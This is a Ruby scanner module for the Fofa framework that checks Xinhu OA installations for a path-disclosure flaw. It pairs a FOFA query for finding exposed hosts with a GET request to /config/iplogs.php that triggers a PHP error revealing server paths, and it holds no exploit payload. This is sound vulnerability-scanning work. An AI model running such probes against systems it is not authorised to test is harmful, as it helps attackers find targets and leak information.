if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "信呼-OA路径泄露",
      "Description": "信呼-OA路径泄露",
      "Product": "信呼-OA系统",
      "Homepage": "http://www.rockoa.com/",
      "DisclosureDate": "2019-12-10",
      "Author": "linlanxi7552659@gmail.com",
      "FofaQuery": "app=\"信呼-OA系统\"",
      "Level": "0",
      "Impact": "<p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p>",
      "Recommandation": "<p>对网站错误信息进行统一返回，模糊化处理。</p><p>对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p>",
      "References": [
            "http://www.rockoa.com/view_core.html"
      ],
      "HasExp": false,
      "ExpParams": [],
      "is0day": true,
      "ExpTips": {
            "type": "Tips",
            "content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/config/iplogs.php",
                        "follow_redirect": true,
                        "header": {},
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "Uncaught Error: Call to undefined function getconfig",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "Posttime": "2019-12-10 02:22:32",
      "fofacli_version": "3.10.2",
      "fofascan_version": "0.1.16",
      "status": 2
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end